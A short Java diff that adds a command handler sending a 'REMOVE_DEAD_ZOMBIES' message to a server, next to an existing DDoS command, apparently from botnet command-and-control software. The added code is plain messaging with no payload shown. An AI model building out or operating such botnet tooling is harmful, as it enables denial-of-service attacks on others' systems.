@@ -21,6 +21,21 @@ import org.jcom.UnknownCommandException;
 import org.jnetwork.DataPackage;
 
 public class CommandActions {
+	public static CommandJob getRemoveDeadZombiesAction() {
+		return new CommandJob() {
+			@Override
+			public Object doJob(Command command) {
+				try {
+					ClientNetwork.getClient().getOutputStream()
+							.writeObject(new DataPackage().setMessage("REMOVE_DEAD_ZOMBIES"));
+				} catch (IOException e) {
+					e.printStackTrace();
+				}
+				return null;
+			}
+		};
+	}
+
 	public static CommandJob getDdosAction() {
 		return new CommandJob() {
 			@Override
